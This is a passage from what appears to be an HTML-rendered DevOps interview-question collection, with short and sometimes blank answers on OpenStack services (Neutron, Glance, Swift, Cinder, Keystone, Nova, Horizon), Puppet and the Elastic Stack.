&lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain these network types: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Management Network&lt;/li&gt; &#xA;   &lt;li&gt;Guest Network&lt;/li&gt; &#xA;   &lt;li&gt;API Network&lt;/li&gt; &#xA;   &lt;li&gt;External Network&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt;  &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Management Network - used for internal communication between OpenStack components. Any IP address in this network is accessible only within the datacetner&lt;/li&gt; &lt;li&gt;Guest Network - used for communication between instances/VMs&lt;/li&gt; &lt;li&gt;API Network - used for services API communication. Any IP address in this network is publicly accessible&lt;/li&gt; &lt;li&gt;External Network - used for public communication. Any IP address in this network is accessible by anyone on the internet &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;In which order should you remove the following entities: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Network&lt;/li&gt; &#xA;   &lt;li&gt;Port&lt;/li&gt; &#xA;   &lt;li&gt;Router&lt;/li&gt; &#xA;   &lt;li&gt;Subnet&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt;  &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Port&lt;/li&gt; &#xA;   &lt;li&gt;Subnet&lt;/li&gt; &#xA;   &lt;li&gt;Router&lt;/li&gt; &#xA;   &lt;li&gt;Network&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;There are many reasons for that. One for example: you can&#39;t remove router if there are active ports assigned to it. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a provider network?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What components and services exist for L2 and L3?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the ML2 plug-in? Explain its architecture&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the L2 agent? How does it works and what is it responsible for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the L3 agent? How does it works and what is it responsible for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what the Metadata agent is responsible for&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What networking entities Neutron supports?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you debug OpenStack networking issues? (tools, logs, ...)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;OpenStack - Glance&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Glance in detail&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Glance is the OpenStack image service&lt;/li&gt; &lt;li&gt;It handles requests related to instances disks and images&lt;/li&gt; &lt;li&gt;Glance also used for creating snapshots for quick instances backups&lt;/li&gt; &lt;li&gt;Users can use Glance to create new images or upload existing ones &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe Glance architecture&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;glance-api - responsible for handling image API calls such as retrieval and storage. It consists of two APIs: 1. registry-api - responsible for internal requests 2. user API - can be accessed publicly&lt;/li&gt; &lt;li&gt;glance-registry - responsible for handling image metadata requests (e.g. size, type, etc). This component is private which means it&#39;s not available publicly&lt;/li&gt; &lt;li&gt;metadata definition service - API for custom metadata&lt;/li&gt; &lt;li&gt;database - for storing images metadata&lt;/li&gt; &lt;li&gt;image repository - for storing images. This can be a filesystem, swift object storage, HTTP, etc. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h4&gt;OpenStack - Swift&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Swift in detail&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Swift is Object Store service and is an highly available, distributed and consistent store designed for storing a lot of data&lt;/li&gt; &lt;li&gt;Swift is distributing data across multiple servers while writing it to multiple disks&lt;/li&gt; &lt;li&gt;One can choose to add additional servers to scale the cluster. All while swift maintaining integrity of the information and data replications. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can users store by default an object of 100GB in size?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Not by default. Object Storage API limits the maximum to 5GB per object but it can be adjusted. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the following in regards to Swift: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Container&lt;/li&gt; &#xA;   &lt;li&gt;Account&lt;/li&gt; &#xA;   &lt;li&gt;Object&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Container - Defines a namespace for objects.&lt;/li&gt; &lt;li&gt;Account - Defines a namespace for containers&lt;/li&gt; &lt;li&gt;Object - Data content (e.g. image, document, ...) &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? there can be two objects with the same name in the same container but not in two different containers&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;False. Two objects can have the same name if they are in different containers. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;OpenStack - Cinder&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Cinder in detail&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Cinder is OpenStack Block Storage service&lt;/li&gt; &lt;li&gt;It basically provides used with storage resources they can consume with other services such as Nova&lt;/li&gt; &lt;li&gt;One of the most used implementations of storage supported by Cinder is LVM&lt;/li&gt; &lt;li&gt;From user perspective this is transparent which means the user doesn&#39;t know where, behind the scenes, the storage is located or what type of storage is used &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe Cinder&#39;s components&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;cinder-api - receives API requests&lt;/li&gt; &lt;li&gt;cinder-volume - manages attached block devices&lt;/li&gt; &lt;li&gt;cinder-scheduler - responsible for storing volumes &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h4&gt;OpenStack - Keystone&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you describe the following concepts in regards to Keystone? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Role&lt;/li&gt; &#xA;   &lt;li&gt;Tenant/Project&lt;/li&gt; &#xA;   &lt;li&gt;Service&lt;/li&gt; &#xA;   &lt;li&gt;Endpoint&lt;/li&gt; &#xA;   &lt;li&gt;Token&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Role - A list of rights and privileges determining what a user or a project can perform&lt;/li&gt; &lt;li&gt;Tenant/Project - Logical representation of a group of resources isolated from other groups of resources. It can be an account, organization, ...&lt;/li&gt; &lt;li&gt;Service - An endpoint which the user can use for accessing different resources&lt;/li&gt; &lt;li&gt;Endpoint - a network address which can be used to access a certain OpenStack service&lt;/li&gt; &lt;li&gt;Token - Used for access resources while describing which resources can be accessed by using a scope &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are the properties of a service? In other words, how a service is identified?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Using:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Name&lt;/li&gt; &lt;li&gt;ID number&lt;/li&gt; &lt;li&gt;Type&lt;/li&gt; &lt;li&gt;Description &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the following: - PublicURL - InternalURL - AdminURL&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;PublicURL - Publicly accessible through public internet&lt;/li&gt; &lt;li&gt;InternalURL - Used for communication between services&lt;/li&gt; &lt;li&gt;AdminURL - Used for administrative management &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a service catalog?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A list of services and their endpoints &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;OpenStack Advanced - Services&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe each of the following services &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Swift&lt;/li&gt; &#xA;   &lt;li&gt;Sahara&lt;/li&gt; &#xA;   &lt;li&gt;Ironic&lt;/li&gt; &#xA;   &lt;li&gt;Trove&lt;/li&gt; &#xA;   &lt;li&gt;Aodh&lt;/li&gt; &#xA;   &lt;li&gt;Ceilometer&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Swift - highly available, distributed, eventually consistent object/blob store&lt;/li&gt; &lt;li&gt;Sahara - Manage Hadoop Clusters&lt;/li&gt; &lt;li&gt;Ironic - Bare Metal Provisioning&lt;/li&gt; &lt;li&gt;Trove - Database as a service that runs on OpenStack&lt;/li&gt; &lt;li&gt;Aodh - Alarms Service&lt;/li&gt; &lt;li&gt;Ceilometer - Track and monitor usage &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Identify the service/project used for each of the following: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Database as a service which runs on OpenStack&lt;/li&gt; &#xA;   &lt;li&gt;Bare Metal Provisioning&lt;/li&gt; &#xA;   &lt;li&gt;Track and monitor usage&lt;/li&gt; &#xA;   &lt;li&gt;Alarms Service&lt;/li&gt; &#xA;   &lt;li&gt;Manage Hadoop Clusters&lt;/li&gt; &#xA;   &lt;li&gt;highly available, distributed, eventually consistent object/blob store&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Database as a service which runs on OpenStack - Trove&lt;/li&gt; &lt;li&gt;Bare Metal Provisioning - Ironic&lt;/li&gt; &lt;li&gt;Track and monitor usage - Ceilometer&lt;/li&gt; &lt;li&gt;Alarms Service - Aodh&lt;/li&gt; &lt;li&gt;Manage Hadoop Clusters&lt;/li&gt; &lt;li&gt;Manage Hadoop Clusters - Sahara&lt;/li&gt; &lt;li&gt;highly available, distributed, eventually consistent object/blob store - Swift &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h4&gt;OpenStack Advanced - Keystone&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you describe Keystone service in detail?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;You can&#39;t have OpenStack deployed without Keystone&lt;/li&gt; &lt;li&gt;It Provides identity, policy and token services &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;The authentication provided is for both users and services&lt;/li&gt; &#xA;     &lt;li&gt;The authorization supported is token-based and user-based.&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;There is a policy defined based on RBAC stored in a JSON file and each line in that file defines the level of access to apply &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe Keystone architecture&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;There is a service API and admin API through which Keystone gets requests&lt;/li&gt; &lt;li&gt;Keystone has four backends: &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;Token Backend - Temporary Tokens for users and services&lt;/li&gt; &#xA;     &lt;li&gt;Policy Backend - Rules management and authorization&lt;/li&gt; &#xA;     &lt;li&gt;Identity Backend - users and groups (either standalone DB, LDAP, ...)&lt;/li&gt; &#xA;     &lt;li&gt;Catalog Backend - Endpoints&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;It has pluggable environment where you can integrate with: &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;LDAP&lt;/li&gt; &#xA;     &lt;li&gt;KVS (Key Value Store)&lt;/li&gt; &#xA;     &lt;li&gt;SQL&lt;/li&gt; &#xA;     &lt;li&gt;PAM&lt;/li&gt; &#xA;     &lt;li&gt;Memcached &lt;/li&gt;&#xA;    &lt;/ul&gt;&lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;    &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe the Keystone authentication process&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Keystone gets a call/request and checks whether it&#39;s from an authorized user, using username, password and authURL&lt;/li&gt; &lt;li&gt;Once confirmed, Keystone provides a token.&lt;/li&gt; &lt;li&gt;A token contains a list of user&#39;s projects so there is no to authenticate every time and a token can submitted instead &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h4&gt;OpenStack Advanced - Compute (Nova)&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What each of the following does?: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;nova-api&lt;/li&gt; &#xA;   &lt;li&gt;nova-compuate&lt;/li&gt; &#xA;   &lt;li&gt;nova-conductor&lt;/li&gt; &#xA;   &lt;li&gt;nova-cert&lt;/li&gt; &#xA;   &lt;li&gt;nova-consoleauth&lt;/li&gt; &#xA;   &lt;li&gt;nova-scheduler&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;nova-api - responsible for managing requests/calls&lt;/li&gt; &lt;li&gt;nova-compute - responsible for managing instance lifecycle&lt;/li&gt; &lt;li&gt;nova-conductor - Mediates between nova-compute and the database so nova-compute doesn&#39;t access it directly &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What types of Nova proxies are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Nova-novncproxy - Access through VNC connections&lt;/li&gt; &lt;li&gt;Nova-spicehtml5proxy - Access through SPICE&lt;/li&gt; &lt;li&gt;Nova-xvpvncproxy - Access through a VNC connection &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h4&gt;OpenStack Advanced - Networking (Neutron)&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain BGP dynamic routing&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the role of network namespaces in OpenStack?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;OpenStack Advanced - Horizon&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you describe Horizon in detail?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Django-based project focusing on providing an OpenStack dashboard and the ability to create additional customized dashboards&lt;/li&gt; &lt;li&gt;You can use it to access the different OpenStack services resources - instances, images, networks, ... &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;By accessing the dashboard, users can use it to list, create, remove and modify the different resources&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;It&#39;s also highly customizable and you can modify or add to it based on your needs &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What can you tell about Horizon architecture?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;API is backward compatible&lt;/li&gt; &lt;li&gt;There are three type of dashboards: user, system and settings&lt;/li&gt; &lt;li&gt;It provides core support for all OpenStack core projects such as Neutron, Nova, etc. (out of the box, no need to install extra packages or plugins)&lt;/li&gt; &lt;li&gt;Anyone can extend the dashboards and add new components&lt;/li&gt; &lt;li&gt;Horizon provides templates and core classes from which one can build its own dashboard &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h2&gt;Puppet&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Puppet? How does it works?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Puppet architecture&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you compare Puppet to other configuration management tools? Why did you chose to use Puppet?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the following: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Module&lt;/li&gt; &#xA;   &lt;li&gt;Manifest&lt;/li&gt; &#xA;   &lt;li&gt;Node&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Facter&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is MCollective?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Do you have experience with writing modules? Which module have you created and for what?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is Hiera&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h2&gt;Elastic&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the Elastic Stack?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;The Elastic Stack consists of:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Elasticsearch&lt;/li&gt; &#xA;   &lt;li&gt;Kibana&lt;/li&gt; &#xA;   &lt;li&gt;Logstash&lt;/li&gt; &#xA;   &lt;li&gt;Beats&lt;/li&gt; &#xA;   &lt;li&gt;Elastic Hadoop&lt;/li&gt; &#xA;   &lt;li&gt;APM Server&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Elasticserach, Logstash and Kibana are also known as the ELK stack. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is Elasticsearch&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;From the official &lt;a href=&#34;https://www.elastic.co/guide/en/elasticsearch/reference/current/documents-indices.html&#34;&gt;docs&lt;/a&gt;:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;Elasticsearch is a distributed document store. Instead of storing information as rows of columnar data, Elasticsearch stores complex data structures that have been serialized as JSON documents&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Logstash?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;From the &lt;a href=&#34;https://logit.io/blog/post/the-top-50-elk-stack-and-elasticsearch-interview-questions&#34;&gt;blog&lt;/a&gt;:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;Logstash is a powerful, flexible pipeline that collects, enriches and transports data. It works as an extract, transform &amp;amp; load (ETL) tool for collecting log messages.&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what beats are&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Beats are lightweight data shippers. These data shippers installed on the client where the data resides. Examples of beats: Filebeat, Metricbeat, Auditbeat. There are much more.&lt;br&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Kibana?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;From the official docs:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;Kibana is an open source analytics and visualization platform designed to work with Elasticsearch. You use Kibana to search, view, and interact with data stored in Elasticsearch indices. You can easily perform advanced data analysis and visualize your data in a variety of charts, tables, and maps.&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe what happens from the moment an app logged some information until it&#39;s displayed to the user in a dashboard when the Elastic stack is used&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;The process may vary based on the chosen architecture and the processing you may want to apply to the logs. One possible workflow is:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ol&gt;&#xA;  &lt;b&gt; &lt;li&gt;The data logged by the application is picked by filebeat and sent to logstash&lt;/li&gt; &lt;li&gt;Logstash process the log based on the defined filters. Once done, the output is sent to Elasticsearch&lt;/li&gt; &lt;li&gt;Elasticsearch stores the document it got and the document is indexed for quick future access&lt;/li&gt; &lt;li&gt;The user creates visualizations in Kibana which based on the indexed data&lt;/li&gt; &lt;li&gt;The user creates a dashboard which composed out of the visualization created in the previous step &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ol&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h5&gt;Elasticsearch&lt;/h5&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a data node?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;This is where data is stored and also where different processing takes place (e.g. when you search for a data). &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a master node?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Par of a master node responsibilites:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Track the status of all the nodes in the cluster&lt;/li&gt; &#xA;   &lt;li&gt;Verify replicas are working and the data is available from every data node.&lt;/li&gt; &#xA;   &lt;li&gt;No hot nodes (no data node that works much harder than other nodes)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;While there can be multiple master nodes in reality only of them is the elected master node. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an ingest node?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A node which responsible for parsing the data. In case you don&#39;t use logstash then this node can recieve data from beats and parse it, similarly to how it can be parsed in Logstash. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Coordinating node?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A Coordinating node responsible for routing requests out and in to the cluser (data nodes). &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How data is stored in elasticsearch?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Data is stored in an index&lt;/li&gt; &lt;li&gt;The index is spread across the cluster using shards &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an Index?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Index in Elastic is in most cases compared to a whole database from the SQL/NoSQL world.&lt;br&gt; You can choose to have one index to hold all the data of your app or have multiple indices where each index holds different type of your app (e.g. index for each service your app is running).&lt;/p&gt; &lt;p&gt;The official docs also offer a great explanation (in general, it&#39;s really good documentation, as every project should have):&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;An index can be thought of as an optimized 